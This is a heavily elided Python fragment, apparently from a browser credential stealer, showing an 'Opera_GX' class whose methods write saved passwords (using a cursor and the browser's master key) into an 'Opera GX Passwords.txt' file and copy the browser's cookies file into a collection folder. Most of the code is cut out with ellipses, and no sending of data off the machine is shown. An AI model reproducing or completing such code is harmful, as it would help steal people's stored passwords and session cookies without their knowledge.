...
class Opera_GX:
    ...
    def __write_passwords(self, cursor, master_key):
        ...
        with open(f"{self.storage_path}{self.storage_folder}{self.browser_folder}/Opera GX Passwords.txt", "a", encoding='utf-8') as passwords:
    ...
    def run(self):
        ...
        try:
            ...
            if (path.exists(self.cookies_path)) is True:
                ...
                copyfile(self.cookies_path, f"{self.storage_path}{self.storage_folder}{self.browser_folder}/Opera GX Cookies", follow_symlinks=True)
